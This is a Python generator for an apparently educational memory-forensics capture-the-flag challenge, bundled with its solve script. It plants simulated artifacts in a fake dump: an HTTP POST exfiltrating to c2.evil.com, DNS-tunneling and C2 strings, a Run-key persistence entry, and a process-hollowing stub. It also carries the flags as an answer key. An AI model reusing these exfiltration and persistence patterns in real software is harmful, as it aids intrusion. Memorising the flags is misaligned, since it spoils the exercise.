#!/usr/bin/env python3
"""
Volatility Master - College CTF 2026
Difficulty: HARD (900 pts)

Creates a realistic memory dump with:
1. Process hollowing (legitimate process with injected code)
2. Encrypted memory regions
3. Hidden network connections
4. Anti-forensics techniques
5. Multiple flags hidden in different locations

The flag is split across multiple artifacts that must be combined.
"""

import os
import struct
import hashlib
import random
import json
from pathlib import Path

class MemoryDumpGenerator:
    """Generate realistic memory dump with hidden flags"""
    
    def __init__(self):
        self.memory = bytearray(1024 * 1024 * 50)  # 50MB dump
        self.processes = []
        self.network_connections = []
        self.offset = 0x10000  # Start after reserved area
        
    def write_at(self, offset, data):
        """Write data at specific offset"""
        self.memory[offset:offset+len(data)] = data
        return offset
    
    def add_process(self, pid, name, ppid, image_base, threads):
        """Add process metadata"""
        self.processes.append({
            'pid': pid,
            'name': name,
            'ppid': ppid,
            'image_base': image_base,
            'threads': threads
        })
    
    def add_network_connection(self, src_ip, src_port, dst_ip, dst_port, pid, state):
        """Add network connection metadata"""
        self.network_connections.append({
            'src': f"{src_ip}:{src_port}",
            'dst': f"{dst_ip}:{dst_port}",
            'pid': pid,
            'state': state
        })
    
    def create_flag_artifacts(self):
        """Create multiple flag fragments across the dump"""
        
        # The flag
        flag = "flag{v0l4t1l1ty_m4st3r_4dv4nc3d_f0r3ns1cs}"
        
        # Fragment 1: In a "process" memory (plain text)
        offset1 = 0x100000
        self.write_at(offset1, b"SECRET_KEY=" + flag.encode())
        
        # Fragment 2: In "registry" (XOR encrypted)
        offset2 = 0x200000
        key = 0x42
        encrypted = bytes([b ^ key for b in flag.encode()])
        self.write_at(offset2, b"EncryptedData=" + encrypted)
        
        # Fragment 3: In "network" traffic (base64 encoded)
        import base64
        offset3 = 0x300000
        encoded = base64.b64encode(flag.encode())
        http_request = f"GET /api/data?q={encoded.decode()} HTTP/1.1\r\nHost: ctf.example.com\r\n\r\n".encode()
        self.write_at(offset3, http_request)
        
        # Fragment 4: In "credentials" (split across multiple locations)
        offset4 = 0x400000
        creds = f"user:admin\npass:{flag}\nhost:192.168.1.100".encode()
        self.write_at(offset4, creds)
        
        # Fragment 5: In "shellcode" (obfuscated)
        offset5 = 0x500000
        shellcode = bytearray()
        for i, c in enumerate(flag.encode()):
            shellcode.extend([c ^ (i & 0xFF), 0x90, 0x90])  # XOR with position + NOPs
        self.write_at(offset5, bytes(shellcode))
        
        return {
            'process': hex(offset1),
            'registry': hex(offset2),
            'network': hex(offset3),
            'credentials': hex(offset4),
            'shellcode': hex(offset5)
        }
    
    def create_process_hollowing(self):
        """Simulate process hollowing - legitimate process with injected code"""
        
        # Legitimate process: svchost.exe
        legitimate_pid = 1024
        self.add_process(legitimate_pid, "svchost.exe", 600, 0x7ff00000, 15)
        
        # Injected code in the process
        offset = 0x7ff10000
        
        # Shellcode that would normally be malicious
        shellcode = (
            b"\x48\x89\xe5"              # mov rbp, rsp
            b"\x48\x83\xec\x20"          # sub rsp, 32
            b"\x48\x31\xc0"              # xor rax, rax
            b"\x48\x89\xc7"              # mov rdi, rax
            b"\x48\x8d\x35\x00\x00\x00\x00"  # lea rsi, [rip]
        )
        
        self.write_at(offset, shellcode)
        
        # Hidden flag in process memory (encoded as UTF-16)
        flag_utf16 = "flag{process_hollowing_detected}".encode('utf-16-le')
        self.write_at(offset + 0x1000, flag_utf16)
        
        return legitimate_pid
    
    def create_anti_forensics(self):
        """Add anti-forensics artifacts"""
        
        # 1. Timestomping - fake timestamps
        timestamps = {
            0x600000: "2025-01-15 10:30:00",  # Original
            0x600010: "2024-01-01 00:00:00",  # Modified (timestomped)
        }
        
        for offset, ts in timestamps.items():
            self.write_at(offset, ts.encode())
        
        # 2. Process name spoofing
        real_name = "malware.exe"
        fake_name = "svchost.exe"
        self.write_at(0x700000, real_name.encode())
        self.write_at(0x700010, fake_name.encode())
        
        # 3. Hidden files in alternate data streams
        ads_path = "C:\\Windows\\System32\\config\\SAM:hidden_flag"
        hidden_flag = "flag{alternate_data_stream_found}"
        self.write_at(0x800000, ads_path.encode() + b"\x00" + hidden_flag.encode())
    
    def create_network_artifacts(self):
        """Create network connection artifacts"""
        
        # Normal connections
        self.add_network_connection("192.168.1.100", 49152, "142.250.80.46", 443, 1024, "ESTABLISHED")
        self.add_network_connection("192.168.1.100", 49153, "151.101.1.69", 443, 2048, "ESTABLISHED")
        
        # Suspicious connection (C2 server)
        self.add_network_connection("192.168.1.100", 49154, "185.220.101.45", 8443, 3072, "ESTABLISHED")
        
        # Hidden DNS tunneling
        dns_query = "flag{dns_tunneling_exfiltration}.data.evil.com"
        self.write_at(0x900000, dns_query.encode())
        
        # Exfiltrated data in HTTP
        http_exfil = (
            "POST /upload HTTP/1.1\r\n"
            "Host: c2.evil.com\r\n"
            "Content-Type: application/octet-stream\r\n"
            "\r\n"
            "flag{data_exfiltrated_via_http}"
        ).encode()
        self.write_at(0x910000, http_exfil)
    
    def create_registry_artifacts(self):
        """Create Windows registry artifacts"""
        
        # Persistence mechanism
        reg_key = "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
        reg_value = "C:\\Users\\admin\\AppData\\Local\\Temp\\update.exe"
        self.write_at(0xA00000, f"{reg_key}\\WindowsUpdate = {reg_value}".encode())
        
        # Hidden configuration
        config = json.dumps({
            "c2_server": "185.220.101.45",
            "port": 8443,
            "key": "flag{registry_persistence_detected}",
            "sleep_time": 300
        })
        self.write_at(0xA10000, config.encode())
    
    def generate(self, output_file="memory_dump.raw"):
        """Generate the complete memory dump"""
        
        print("[*] Generating memory dump...")
        
        # Create artifacts
        print("[*] Creating flag artifacts...")
        flag_offsets = self.create_flag_artifacts()
        
        print("[*] Creating process hollowing...")
        hollowed_pid = self.create_process_hollowing()
        
        print("[*] Creating anti-forensics artifacts...")
        self.create_anti_forensics()
        
        print("[*] Creating network artifacts...")
        self.create_network_artifacts()
        
        print("[*] Creating registry artifacts...")
        self.create_registry_artifacts()
        
        # Add some normal processes
        self.add_process(4, "System", 0, 0x00400000, 150)
        self.add_process(100, "csrss.exe", 4, 0x7ff600000000, 8)
        self.add_process(600, "services.exe", 4, 0x7ff610000000, 12)
        self.add_process(2048, "explorer.exe", 100, 0x7ff620000000, 50)
        self.add_process(3072, "chrome.exe", 2048, 0x7ff630000000, 20)
        
        # Add some noise
        print("[*] Adding noise...")
        for i in range(1000):
            noise_offset = random.randint(0x1000000, len(self.memory) - 100)
            noise = os.urandom(random.randint(10, 100))
            self.write_at(noise_offset, noise)
        
        # Write dump
        print(f"[*] Writing dump to {output_file}...")
        with open(output_file, 'wb') as f:
            f.write(self.memory)
        
        # Write metadata (for challenge creation, not distributed)
        metadata = {
            'flags': flag_offsets,
            'processes': self.processes,
            'network': self.network_connections,
            'size_mb': 50
        }
        
        with open('metadata.json', 'w') as f:
            json.dump(metadata, f, indent=2)
        
        print(f"[+] Dump generated: {output_file} ({os.path.getsize(output_file)} bytes)")
        print(f"[+] Metadata: metadata.json")
        
        return metadata

def create_solve_script():
    """Create solution script"""
    solve_code = '''#!/usr/bin/env python3
"""
Volatility Master - Solution Script

This challenge requires multi-step forensics:
1. Identify suspicious processes
2. Extract hidden data from memory
3. Decode/decrypt various encodings
4. Reconstruct network traffic
5. Combine fragments to get final flag

The flag format: flag{...}
"""

import re
import base64
from pathlib import Path

def strings(data, min_length=4):
    """Extract ASCII strings from binary data"""
    pattern = rb'[\\x20-\\x7e]{%d,}' % min_length
    return [m.group().decode('ascii', errors='ignore') for m in re.finditer(pattern, data)]

def xor_decrypt(data, key):
    """XOR decrypt with single byte key"""
    return bytes([b ^ key for b in data])

def solve():
    dump_file = "memory_dump.raw"
    
    if not Path(dump_file).exists():
        print(f"[!] {dump_file} not found!")
        return
    
    print("[*] Loading memory dump...")
    with open(dump_file, 'rb') as f:
        memory = f.read()
    
    print(f"[*] Dump size: {len(memory)} bytes ({len(memory) // (1024*1024)} MB)")
    
    flags_found = []
    
    # Method 1: Search for plaintext flags
    print("\\n[*] Method 1: Searching for plaintext flags...")
    flag_pattern = rb'flag\\{[^}]+\\}'
    plaintext_flags = re.findall(flag_pattern, memory)
    for f in plaintext_flags:
        try:
            decoded = f.decode()
            if decoded not in flags_found:
                flags_found.append(decoded)
                print(f"[+] Found: {decoded}")
        except:
            pass
    
    # Method 2: Search for XOR encrypted flags
    print("\\n[*] Method 2: Searching for XOR encrypted patterns...")
    # Look for patterns that XOR to "flag{"
    target = b"flag{"
    for key in range(256):
        encrypted = bytes([b ^ key for b in target])
        pos = memory.find(encrypted)
        if pos != -1:
            # Found potential XOR encrypted flag, try to extract full flag
            chunk = memory[pos:pos+100]
            decrypted = xor_decrypt(chunk, key)
            flag_match = re.search(rb'flag\\{[^}]+\\}', decrypted)
            if flag_match:
                flag = flag_match.group().decode()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (XOR key=0x{key:02x}): {flag}")
    
    # Method 3: Search for Base64 encoded flags
    print("\\n[*] Method 3: Searching for Base64 encoded flags...")
    b64_pattern = rb'[A-Za-z0-9+/]{20,}={0,2}'
    for match in re.finditer(b64_pattern, memory):
        try:
            decoded = base64.b64decode(match.group())
            flag_match = re.search(rb'flag\\{[^}]+\\}', decoded)
            if flag_match:
                flag = flag_match.group().decode()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (Base64): {flag}")
        except:
            pass
    
    # Method 4: Search for UTF-16 encoded flags
    print("\\n[*] Method 4: Searching for UTF-16 encoded flags...")
    utf16_pattern = rb'(?:f\\x00l\\x00a\\x00g\\x00\\{\\x00)'
    for match in re.finditer(utf16_pattern, memory):
        start = match.start()
        chunk = memory[start:start+200]
        try:
            decoded = chunk.decode('utf-16-le', errors='ignore')
            flag_match = re.search(r'flag\\{[^}]+\\}', decoded)
            if flag_match:
                flag = flag_match.group()
                if flag not in flags_found:
                    flags_found.append(flag)
                    print(f"[+] Found (UTF-16): {flag}")
        except:
            pass
    
    # Method 5: Search for hex-encoded flags
    print("\\n[*] Method 5: Searching for hex encoded patterns...")
    hex_pattern = rb'[0-9a-fA-F]{40,}'
    for match in re.finditer(hex_pattern, memory):
        try:
            decoded = bytes.fromhex(match.group().decode()).decode()
            if 'flag{' in decoded:
                flag_match = re.search(r'flag\\{[^}]+\\}', decoded)
                if flag_match:
                    flag = flag_match.group()
                    if flag not in flags_found:
                        flags_found.append(flag)
                        print(f"[+] Found (Hex): {flag}")
        except:
            pass
    
    # Method 6: Search in JSON structures
    print("\\n[*] Method 6: Searching JSON structures...")
    json_pattern = rb'\\{[^{}]*flag[^{}]*\\}'
    for match in re.finditer(json_pattern, memory):
        try:
            data = match.group().decode()
            if 'flag{' in data:
                flag_match = re.search(r'flag\\{[^}]+\\}', data)
                if flag_match:
                    flag = flag_match.group()
                    if flag not in flags_found:
                        flags_found.append(flag)
                        print(f"[+] Found (JSON): {flag}")
        except:
            pass
    
    # Summary
    print("\\n" + "=" * 60)
    print(f"[*] Total flags found: {len(flags_found)}")
    for i, flag in enumerate(flags_found, 1):
        print(f"  {i}. {flag}")
    
    print("\\n[*] The main challenge flag is likely the longest one!")
    
    return flags_found

if __name__ == '__main__':
    solve()
'''
    
    with open('solve.py', 'w') as f:
        f.write(solve_code)

if __name__ == '__main__':
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == 'solve':
        create_solve_script()
    else:
        generator = MemoryDumpGenerator()
        generator.generate()
